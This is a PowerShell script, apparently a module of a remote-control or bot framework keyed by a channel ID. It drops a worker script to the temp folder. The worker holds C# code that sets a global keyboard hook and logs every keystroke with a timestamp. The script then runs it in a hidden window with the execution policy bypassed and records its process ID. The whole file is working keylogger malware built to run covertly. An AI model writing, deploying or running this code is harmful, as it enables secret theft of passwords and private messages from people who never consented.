param($args)

$channelID = $env:ChannelID
$logFile = "$env:TEMP\keylog_$channelID.txt"
$pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
$workerScript = "$env:TEMP\keylog_worker_$channelID.ps1"

# Worker script content (contains the actual keylogger)
$workerContent = @'
$cSharpCode = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

public class Keylogger
{
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string _logFile;
    private static StreamWriter _writer;
    private static Thread _thread;

    public static void Start(string logFile)
    {
        _logFile = logFile;
        _writer = new StreamWriter(logFile, true) { AutoFlush = true };
        _thread = new Thread(Run);
        _thread.SetApartmentState(ApartmentState.STA);
        _thread.Start();
    }

    public static void Stop()
    {
        if (_hookID != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hookID);
        }
        Application.Exit();
        if (_writer != null)
        {
            _writer.Close();
        }
    }

    private static void Run()
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string keyName = ((Keys)vkCode).ToString();
            _writer.WriteLine($"[{DateTime.Now:HH:mm:ss}] {keyName}");
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@
Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms"
$logFile = "$env:TEMP\keylog_$env:ChannelID.txt"
[Keylogger]::Start($logFile)
while($true) {
    Start-Sleep -Seconds 10
}
'@

# Write worker script to temp file
$workerContent | Out-File -FilePath $workerScript -Encoding utf8

# Launch worker in hidden PowerShell window
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell.exe"
$psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$workerScript`""
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow = $true
$p = [System.Diagnostics.Process]::Start($psi)

# Save PID
$p.Id | Out-File -FilePath $pidFile

Write-Output "Keylogger started with PID $($p.Id). Logging to $logFile"